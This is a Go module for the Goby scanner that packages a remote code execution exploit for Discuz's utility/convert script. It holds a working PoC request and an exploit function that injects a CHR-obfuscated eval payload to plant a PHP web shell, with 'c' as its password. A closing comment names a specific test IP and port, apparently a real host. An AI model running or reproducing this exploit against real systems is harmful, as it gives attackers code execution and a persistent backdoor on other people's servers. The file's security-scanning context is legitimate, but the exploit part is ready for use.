package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Discuz 3.3 RCE getshell",
    "Description": "An attacker can execute PHP code at will",
    "Product": "discuz",
    "Homepage": "https://www.discuz.net/",
    "DisclosureDate": "2021-06-14",
    "Author": "hututued",
    "GobyQuery": "app=\"Discuz\"",
    "Level": "3",
    "Impact": "<p>The attacker can execute PHP code at will and get the permission of the server</p>",
    "Recommendation": "<p>Upgrade the official patch</p>",
    "References": [
        "https://blog.csdn.net/weixin_43221560/article/details/93094937"
    ],
    "HasExp": true,
    "ExpParams": null,
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "RCE"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10212"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		// PoC 函数
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/utility/convert/index.php?a=config&source=d7.2_x2.0&newconfig[aaa%0a%0decho(md5(88));//]=aaaa&submit=yes"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Upgrade-Insecure-Requests", "1")
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "2a38a4a9316c49e5a833517c45d31070")
			}
			return false
		},

		// Exp 函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			phpshell := `eval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(99).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));` // eval里的chr码是： eval("$_POST[c];");'
			uri := "/utility/convert/index.php?a=config&source=d7.2_x2.0&newconfig[aaa%0a%0d" + phpshell + "//]=aaaa&submit=yes"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = expResult.HostInfo.FixedHostInfo + "/utility/convert/index.php \npass:c"
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}

//测试ip端口 164.155.74.69:3800
